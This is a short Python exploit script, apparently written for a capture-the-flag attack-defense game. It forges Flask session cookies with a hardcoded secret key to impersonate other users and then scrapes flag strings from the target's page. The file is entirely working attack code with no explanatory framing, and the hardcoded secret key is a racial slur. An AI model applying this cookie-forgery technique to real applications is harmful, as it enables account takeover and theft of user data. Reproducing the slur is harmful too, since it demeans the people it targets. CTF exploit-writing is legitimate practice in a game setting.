#!/usr/bin/env python3

import requests
import re
import sys
from itsdangerous import URLSafeTimedSerializer
from utils import attack_data

secret_key = 'nigga'

def generate_flask_session(secret_key, user_id, username):
    serializer = URLSafeTimedSerializer(secret_key)
    session_data = {
        'user_id': str(user_id),
        'username': username
    }
    return serializer.dumps(session_data)
    

def sploit(host: str, username: str, user_id: int, note_id: int):
    session = requests.Session()
    flask_session = generate_flask_session(secret_key, user_id, username)
    session.cookies.set('session', flask_session)
    
    r = session.get(f'http://{host}:5000')
    flags = '\n'.join(re.findall("[0-9-A-Z]{31}=", r.text))
    print(flags, flush=True)

if __name__ == "__main__":
    host = sys.argv[1]
    for ad in attack_data(host):
        username, user_id, note_id = ad.split(":")
        sploit(host, username, int(user_id), int(note_id))